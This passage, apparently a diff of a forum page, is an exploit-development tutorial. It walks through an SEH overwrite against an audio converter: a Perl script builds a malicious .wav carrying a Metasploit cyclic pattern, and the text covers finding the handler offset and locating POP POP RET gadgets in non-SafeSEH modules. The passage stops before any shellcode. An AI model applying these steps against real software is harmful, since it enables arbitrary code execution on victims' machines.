+<a href="../external.html?link=http://imageshack.us/photo/my-images/189/sehandleroverwrite7.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<b><u><br/>
+Finding offset to the seh handler</u></b><br/>
+<br/>
+1)    Now to write an seh based exploit, we have to know where exactly our seh handler is located. To find the exact offset, let us create a pattern of 5000 characters using metasploit and replace the 5000 A‚Äôs in our perl script with this pattern as shown below:<br/>
+<br/>
+<a href="../external.html?link=http://imageshack.us/photo/my-images/690/offset8.png/" target="_blank"><img alt="" border="0" src="../external.html?link=http://imageshack.com/e/p5aMES7Yj"/></a><br/>
+<br/>
+Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br/>
+<br/>
+Perl script with a pattern of 5000 characters is shown below:<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<pre class="bbcode_code"style="height:84px;">my $file = &quot;exploit_seh.wav&quot;;
-my $junk =&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk&quot;;
+	<pre class="bbcode_code" style="height:84px;">my $file = "exploit_seh.wav";
+my $junk ="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk";
 
-open OUTPUT, &quot;&gt;&quot;, &quot;$file&quot;;
+open OUTPUT, "&gt;", "$file";
 print OUTPUT $junk;</pre>
-</div>2)    After running the script ìexploit_seh.wavî file is created, now attach the debugger to the process and after opening the exploit_seh.wav file with ìPDF All to mp3 converterî we find that seh handler contains the pattern 39684638, because of the little endian format you will have to read it as 38 46 68 39 which stands for 8Fh9<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/707/sehandleroverwrite9.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/89/sehandleroverwrite10.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-3)    Now let us give this value to the pattern_offset.rb (ruby script in metasploit), after giving this value to the metasploit i found that the offset to the seh handler is 4136, which means the offset of the pointer to the next seh record is 4136-4 = 4132<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/153/offset11.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-4)    Now let us modify our script to contain 4132 Aís followed by break (ì\xcc\xcc\xcc\xccî) instruction then seh handler would contain address of pop pop ret instruction and then a pattern (this will be replaced with our shellcode). <br />
-<br />
-If everything works well the application should run and when the exception occurs, the control is passed to the seh handler (which executes POP POP RET instruction, which removes first 8 bytes from the stack and puts the next 4 bytes into EIP, which is the address of the pointer to the next seh record ) because of this the instruction at the pointer to the next seh record is executed (which is the break instruction), so if the exploit succeeds the application should pause at break instruction (ì\xcc\xcc\xcc\xccî)<br />
-<b><u><br />
-Finding the address of POP POP RET</u></b><br />
-<br />
-5)     Before we modify the script, Lets us find the address of pop pop ret in the application dll and also we should make sure that the dll doesnít use the safeseh protection (i.e compiled with safeseh)Öto find the application dllís that are not safeseh compiled, we can use a immunity debugger plugin called pvefindaddr, this plugin will display the dllís which are not safeseh complied (displayed in red) and then we can use the address of POP POP RET instruction from the non safeseh compiled Dll or EXE. The below figure shows pvefindaddr plugin showing the non safeseh dllís and EXEís in red.<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/545/poppopret12.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
-6)    From the above figure we see that there are 4 application dllís and EXEís which are not compiled with safeseh protection (shown in red in the above figure)....i have chosen the application EXE ìAlltomp3.exeî to find the address of POP POP RET.<br />
-<br />
-7)    To find the address of POP POP RET from the EXE, we can use another ruby script in metasploit (msfpescan) as shown below.<br />
-<br />
-<a href="../external.html?link=http://imageshack.us/photo/my-images/571/poppopret13.png/" target="_blank"><img src="../external.html?link=http://imageshack.com/e/p5aMES7Yj" border="0" alt="" /></a><br />
-<br />
-Uploaded with <a href="../external.html?link=http://imageshack.us/" target="_blank">ImageShack.us</a><br />
-<br />
